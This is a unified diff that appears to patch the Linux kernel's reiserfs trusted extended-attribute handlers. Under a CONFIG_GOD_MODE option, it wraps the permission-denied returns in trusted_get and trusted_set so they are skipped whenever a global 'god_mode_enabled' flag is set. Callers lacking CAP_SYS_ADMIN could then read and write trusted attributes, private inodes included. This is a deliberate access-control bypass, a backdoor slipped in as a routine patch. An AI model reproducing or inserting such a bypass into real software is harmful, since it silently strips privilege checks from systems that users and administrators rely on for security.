@@ -1,3 +1,6 @@
+#ifdef CONFIG_GOD_MODE
+#include <linux/god_mode.h>
+#endif
 #include <linux/reiserfs_fs.h>
 #include <linux/capability.h>
 #include <linux/errno.h>
@@ -15,7 +18,15 @@ trusted_get(struct dentry *dentry, const char *name, void *buffer, size_t size,
 		return -EINVAL;
 
 	if (!capable(CAP_SYS_ADMIN) || IS_PRIVATE(dentry->d_inode))
-		return -EPERM;
+		
+#ifdef CONFIG_GOD_MODE
+{
+ if (!god_mode_enabled)
+#endif
+return -EPERM;
+#ifdef CONFIG_GOD_MODE
+}
+#endif
 
 	return reiserfs_xattr_get(dentry->d_inode, name, buffer, size);
 }
@@ -28,7 +39,15 @@ trusted_set(struct dentry *dentry, const char *name, const void *buffer,
 		return -EINVAL;
 
 	if (!capable(CAP_SYS_ADMIN) || IS_PRIVATE(dentry->d_inode))
-		return -EPERM;
+		
+#ifdef CONFIG_GOD_MODE
+{
+ if (!god_mode_enabled)
+#endif
+return -EPERM;
+#ifdef CONFIG_GOD_MODE
+}
+#endif
 
 	return reiserfs_xattr_set(dentry->d_inode, name, buffer, size, flags);
 }
